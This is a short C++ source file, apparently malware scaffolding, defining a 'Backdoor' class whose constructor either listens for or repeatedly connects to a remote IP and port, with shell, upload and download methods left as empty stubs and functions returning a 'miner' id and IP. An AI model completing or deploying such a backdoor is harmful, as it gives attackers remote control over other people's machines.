#include "backdoor.h"

void Backdoor::shell(){
    if(this->is_server){



    }else{



    }
}


void Backdoor::upload(char * path){
    if(this->is_server){



    }else{



    }


}


void Backdoor::download(char *path){
    if(this->is_server){



    }else{



    }


}


std::string Backdoor::get_miner_id(){
    return c->connection_id();
}

std::string Backdoor::get_miner_ip(){
    return c->connection_ip();
}


Backdoor::Backdoor(char *ip, int port, bool is_server){
    this->c = new Communication(ip, port);
    this->is_server = is_server;
    
    if(is_server){
        this->c->listen_forever();

    }else{
        this->c->connect_forever();
    }
}

